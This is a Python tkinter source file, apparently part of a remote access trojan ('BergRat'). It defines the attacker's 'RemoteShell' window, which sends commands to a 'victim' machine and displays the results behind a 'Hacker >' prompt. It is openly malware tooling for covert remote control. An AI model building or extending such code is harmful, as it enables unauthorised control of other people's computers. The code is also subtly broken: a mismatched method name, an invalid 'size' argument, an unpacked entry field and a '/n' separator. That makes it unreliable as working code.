import tkinter as tk
from threading import Thread

"""Remote Shell Class
Description:
- Class used to remote control with a shell a victim
- Represent a bash command prompt
"""


class RemoteShell(tk.Toplevel):
    # Inherits from Tk.Toplevel
    def __init__(self, network, uid, root, nick):
        tk.Toplevel.__init__(self, root)

        # Get the network class
        self.network = network

        # Get user uid
        self.uid = uid

        # Get user nickname
        self.nick = nick

        # GUI Configurations
        self.resizable(False, False)
        self.title("Remote Shell - User: " + self.nick)
        self.geometry("600x400")
        self["bg"] = "black"

        # Bind return to call the function shell_command
        self.bind("<Return>", lambda event: self.shell_command())

        # Create a list object
        self.listbox = tk.Listbox(self, bg="black", fg="white")
        self.listbox.pack(fill="both", size=tk.TOP, expand=True)

        # Insert some funny things
        self.listbox.insert("end", "Hacking console")
        self.listbox.insert("end", "Copyright (c) 2020 BergRat Corps. All Rights reserved")

        # Create a entry to send commands
        self.entry = tk.Entry(self)
        self.entry.config(background="black", foreground="white")

    def add_list(self, uid, command):
        # Call network.send_command with the command and split it to works
        out = self.network.send_command(uid, command).split("/n")

        # Get each element from out
        for i in out:
            # Check if it's not empty
            if i:
                # Insert in the listbox end
                self.listbox.insert("end", i)

        # Scroll to the end
        self.listbox.yview(tk.END)

    # Function to be called when sending commands
    def shell_commands(self):
        # Get the entry text
        command = self.entry.get()

        # Clean entry text
        self.entry.delete(0, tk.END)

        # Insert in the listbox end
        self.listbox.insert("end", "Hacker > " + command)

        # Start a thread to avoid bugs
        t_add_list = Thread(target=self.add_list, args=[self.uid, command])
        t_add_list.daemon = True
        t_add_list.start()